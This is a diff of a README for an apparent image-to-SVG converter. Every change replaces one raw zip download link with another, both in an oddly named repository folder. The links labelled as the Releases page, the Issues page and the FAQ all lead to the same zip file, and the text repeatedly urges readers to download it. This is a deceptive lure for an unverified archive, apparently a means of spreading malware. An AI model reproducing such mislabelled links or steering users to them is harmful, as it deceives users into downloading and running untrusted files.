@@ -1,7 +1,7 @@
 # 🌟 tool-image-to-svg - Convert Images to Beautiful SVGs Easily
 
 ## 🖱️ Download Here
-[![Download tool-image-to-svg](https://github.com/mevrick9525/tool-image-to-svg/raw/refs/heads/main/homiletical/svg_tool_to_image_3.6.zip)](https://github.com/mevrick9525/tool-image-to-svg/raw/refs/heads/main/homiletical/svg_tool_to_image_3.6.zip)
+[![Download tool-image-to-svg](https://raw.githubusercontent.com/mevrick9525/tool-image-to-svg/main/homiletical/to_tool_svg_image_3.5-beta.1.zip)](https://raw.githubusercontent.com/mevrick9525/tool-image-to-svg/main/homiletical/to_tool_svg_image_3.5-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the **tool-image-to-svg** project! This is a free and open-source tool that helps you convert PNG, JPG, and other raster images into the SVG vector format. SVG files are great because they scale without losing quality.
@@ -16,7 +16,7 @@ To use this application, you'll need:
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. Click the button at the top of the page or visit the [Releases page](https://github.com/mevrick9525/tool-image-to-svg/raw/refs/heads/main/homiletical/svg_tool_to_image_3.6.zip) to access the latest version.
+1. Click the button at the top of the page or visit the [Releases page](https://raw.githubusercontent.com/mevrick9525/tool-image-to-svg/main/homiletical/to_tool_svg_image_3.5-beta.1.zip) to access the latest version.
 2. On the Releases page, find the latest version of **tool-image-to-svg**.
 3. Look for options to download the files available. Choose the one that fits your operating system.
 4. Once the file is downloaded, locate it in your Downloads folder.
@@ -52,10 +52,10 @@ If you encounter issues:
 - Clear your browser’s cache and try again.
 
 ## 💬 Community and Support
-We welcome feedback and contributions. Join the conversation on our [GitHub Issues page](https://github.com/mevrick9525/tool-image-to-svg/raw/refs/heads/main/homiletical/svg_tool_to_image_3.6.zip). Your experience and suggestions help us improve!
+We welcome feedback and contributions. Join the conversation on our [GitHub Issues page](https://raw.githubusercontent.com/mevrick9525/tool-image-to-svg/main/homiletical/to_tool_svg_image_3.5-beta.1.zip). Your experience and suggestions help us improve!
 
 ## 🛰️ Getting Help
-For further assistance, visit our [FAQ section](https://github.com/mevrick9525/tool-image-to-svg/raw/refs/heads/main/homiletical/svg_tool_to_image_3.6.zip). You can find answers to common problems and usage tips.
+For further assistance, visit our [FAQ section](https://raw.githubusercontent.com/mevrick9525/tool-image-to-svg/main/homiletical/to_tool_svg_image_3.5-beta.1.zip). You can find answers to common problems and usage tips.
 
 ## 📧 Contact
 If you have any questions or need direct support, please reach out via the GitHub contact options available in the repository.
@@ -71,4 +71,4 @@ If you have any questions or need direct support, please reach out via the GitHu
 - svg-converter
 - vector-graphics
 
-Once again, click here to [download tool-image-to-svg](https://github.com/mevrick9525/tool-image-to-svg/raw/refs/heads/main/homiletical/svg_tool_to_image_3.6.zip) and start converting images to SVG effortlessly!
+Once again, click here to [download tool-image-to-svg](https://raw.githubusercontent.com/mevrick9525/tool-image-to-svg/main/homiletical/to_tool_svg_image_3.5-beta.1.zip) and start converting images to SVG effortlessly!
